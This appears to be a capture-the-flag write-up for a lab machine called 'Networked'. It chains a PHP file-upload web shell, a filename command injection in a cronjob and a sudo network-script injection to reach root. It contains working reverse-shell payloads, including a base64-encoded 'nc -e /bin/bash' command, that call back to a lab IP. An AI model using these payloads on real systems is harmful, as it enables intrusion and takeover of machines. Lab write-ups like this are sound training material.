# Networked \[Easy]

## Report

A file upload vulnerabilty allows us to execute PHP code and obtain a reverse shell. A cronjob executing a script that is vulnerable to path injection and obtain another reverse shell as user 'guly'.

guly can run a network config script as sudo. Any input after a whitespace is executed. A google search would show this. SPwan another shell and become root

## Cheatsheet

```
#Understand file checking process using php -a (Interactive mode)
#Apache config vuln a file with .php extension anywhere will execute the PHP code
vim black.php.jpeg
<?php echo "START<br/><br/>\n\n\n"; system($_GET["cmd"]); echo "\n\n\n<br/><br/>END"; ?>
Navigate to uploads/[file]
?cmd=sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.3%2F9001%200%3E%261

#Revshell from previous shell to become guly
touch 'c; echo bmMgMTAuMTAuMTQuMyA5MDAyIC1lIC9iaW4vYmFzaA== | base64 -d | sh; d'
(nc 10.10.14.3 9003 -e /bin/bash)
Shell kept dying using sh and encoding via base64 was the only way to get stable shell

#guly
sudo /usr/local/sbin/changename.sh
[random input] /bin/bash
#Vulnerability in editing network scripts leads to privesc
```

{% code title="check_attack.php (This was run as a cronjob)" %}
```php
<?php
require '/var/www/html/lib.php';
$path = '/var/www/html/uploads/';
$logpath = '/tmp/attack.log';
$to = 'guly';
$msg= '';
$headers = "X-Mailer: check_attack.php\r\n";

$files = array();
$files = preg_grep('/^([^.])/', scandir($path));

foreach ($files as $key => $value) {
        $msg='';
  if ($value == 'index.html') {
        continue;
  }
  #echo "-------------\n";

  #print "check: $value\n";
  list ($name,$ext) = getnameCheck($value);
  $check = check_ip($name,$value);

  if (!($check[0])) {
    echo "attack!\n";
    # todo: attach file
    file_put_contents($logpath, $msg, FILE_APPEND | LOCK_EX);

    exec("rm -f $logpath");
    exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
    echo "rm -f $path$value\n";
    mail($to, $msg, $msg, $headers, "-F$value");
  }
}

?>

```
{% endcode %}

{% code title="changename.sh" %}
```bash
#!/bin/bash -p
cat > /etc/sysconfig/network-scripts/ifcfg-guly << EoF
DEVICE=guly0
ONBOOT=no
NM_CONTROLLED=no
EoF

regexp="^[a-zA-Z0-9_\ /-]+$"

for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do
        echo "interface $var:"
        read x
        while [[ ! $x =~ $regexp ]]; do
                echo "wrong input, try again"
                echo "interface $var:"
                read x
        done
        echo $var=$x >> /etc/sysconfig/network-scripts/ifcfg-guly
done
  
/sbin/ifup guly0

```
{% endcode %}

## Loot

### Creds

None lmao

### Proof

#### Web directory Structure

* backup
* uploads
* upload.php
* gallery.php

backup contains source code, upload.php allows file upload and gallery.php allows to access uploaded files

The check\_ip function in check\_attack.php is from lib.php which checks if the file name is from a valid IP. The name of file uploaded is modified at the time itself based on sender IP.

```
exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &"
```

This line was vulnerable to path injection, and $path was already defined but not $value

{% embed url="https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f" %}

### Pitch Notes

For PrivEsc, we couldn't

* add to sudoers >>
* revshell .
* chown root.txt :&#x20;
* cat root.txt .

The regex prevented us from using the following characters

But you can simply span a shell using `/bin/bash`

\
